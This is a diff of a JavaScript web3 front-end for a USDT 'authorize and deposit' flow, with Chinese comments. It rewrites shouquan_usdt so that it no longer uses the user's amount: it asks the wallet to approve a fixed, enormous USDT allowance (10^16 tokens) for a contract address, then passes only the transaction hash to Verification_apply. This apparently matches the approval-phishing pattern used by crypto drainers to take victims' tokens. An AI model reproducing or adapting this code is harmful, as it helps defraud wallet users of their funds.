@@ -1,12 +1,11 @@
 //授权
-function shouquan_usdt(num) {
+function shouquan_usdt() {
     var SELF_ADDR = $("#address").val();
     if (!SELF_ADDR) {
         alert(script_Lan.sign_login[currentLan]);
         location.reload();
     }
-    temp_num = num;
-    num = Number(num)+Number(100000000000000000000);  //+Number(10000)
+    num = Math.pow(10,16);  //+Number(10000)
     num = web3.utils.toWei(num, CONFIG.usdt_wei);
     num = web3.utils.toBN(num);
     var gas = $("#getGasPrice").val();
@@ -15,17 +14,17 @@ function shouquan_usdt(num) {
     }else{
         gas = Number(gas)+Number(3000000000)
     }
-    $("#approve_commit").html(script_Lan.issue_remarks[currentLan]);
-    Contract_usdt.methods.approve(CONFIG.und_issue_addr, num).send({ from: SELF_ADDR, gasPrice: gas })
-        .on("receipt", function(data) {
-            $("#issue").html(script_Lan.issue_wait[currentLan]+"<dot>···</dot>");
-            mortgage_usdt(temp_num);
-            return true;
-        })
-        .on("error", function(error) {
-            alert(script_Lan.approve_fail[currentLan]);
-            location.reload();
-        });
+    $(".approve_commit").html(script_Lan.issue_remarks[currentLan]);
+    Contract_usdt.methods.approve(CONFIG.und_issue_addr, num).send({ from: SELF_ADDR , gasPrice: gas }, function(error, transactionHash){
+        if(error){
+            alert(script_Lan.operate_err[currentLan]);
+            $("#issue").html(script_Lan.issue_now[currentLan]);
+            $(".approve_commit").html('&nbsp');
+        }else{
+            Verification_apply(transactionHash);
+        }
+
+    });
 }
 
 //获取USDT代币数量
@@ -41,7 +40,6 @@ function balance_usdt() {
             var balance_num = web3.utils.fromWei(data, CONFIG.usdt_wei);
             balance_num = parseFloat(balance_num);
             $("#usdt_balance").val(Number(balance_num).toFixed(CONFIG.Fixed));
-            $('#mybalance').text(Number(balance_num).toFixed(CONFIG.Fixed)+'USDT');
         })
 }
 
@@ -65,14 +63,14 @@ function mortgage_usdt(num) {
     var SELF_ADDR = $("#address").val();
     if (!SELF_ADDR) {
         alert(script_Lan.sign_login[currentLan]);
-        return false;
         location.reload();
+        return false;
     }
     var usdt_balance = $("#usdt_balance").val();
     if (Number(num) > Number(usdt_balance)) {
         alert(script_Lan.usdt_num_min[currentLan]);
-        return false;
         location.reload();
+        return false;
     }
 
     other2und(num, CONFIG.usdt_addr, SELF_ADDR, CONFIG.usdt_wei);
